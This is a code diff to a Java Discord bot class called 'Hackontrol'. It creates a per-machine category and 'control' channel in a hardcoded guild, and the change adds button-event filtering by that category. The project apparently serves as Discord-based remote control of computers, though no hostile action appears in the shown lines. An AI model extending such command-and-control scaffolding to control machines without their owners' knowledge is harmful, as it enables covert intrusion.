@@ -7,6 +7,7 @@ import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.Message;
 import net.dv8tion.jda.api.entities.MessageHistory;
+import net.dv8tion.jda.api.entities.channel.Channel;
 import net.dv8tion.jda.api.entities.channel.concrete.Category;
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
 import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
@@ -22,6 +23,7 @@ public class Hackontrol {
 
 	private final JDA bot;
 	private final Guild guild;
+	private final Category category;
 	//private final Map<Command, com.khopan.hackontrol.command.Command> map;
 
 	private Hackontrol() {
@@ -36,8 +38,7 @@ public class Hackontrol {
 			this.bot.awaitReady();
 		} catch(Throwable Errors) {
 			System.exit(0);
-			this.guild = null;
-			return;
+			throw new RuntimeException();
 		}
 
 		this.guild = this.bot.getGuildById(1173967259304198154L);
@@ -50,8 +51,8 @@ public class Hackontrol {
 		}*/
 
 		String identifier = Machine.getIdentifier();
-		Category category = DiscordUtils.getOrCreateCategory(this.guild, identifier);
-		TextChannel controlChannel = DiscordUtils.getOrCreateTextChannelInCategory(category, "control");
+		this.category = DiscordUtils.getOrCreateCategory(this.guild, identifier);
+		TextChannel controlChannel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, "control");
 		MessageHistory history = MessageHistory.getHistoryFromBeginning(controlChannel).complete();
 		List<Message> messageList = history.getRetrievedHistory();
 
@@ -178,7 +179,23 @@ public class Hackontrol {
 	private class Listener extends ListenerAdapter {
 		@Override
 		public void onButtonInteraction(ButtonInteractionEvent Event) {
+			Channel channel = Event.getChannel();
+
+			if(!(channel instanceof TextChannel)) {
+				return;
+			}
+
+			TextChannel textChannel = (TextChannel) channel;
+			Category category = textChannel.getParentCategory();
+
+			if(!Hackontrol.this.category.equals(category)) {
+				return;
+			}
+
+			Button button = Event.getButton();
+			String identifier = button.getId();
 			Event.deferReply().queue(hook -> hook.deleteOriginal().queue());
+			System.out.println(identifier);
 		}
 	}
 }
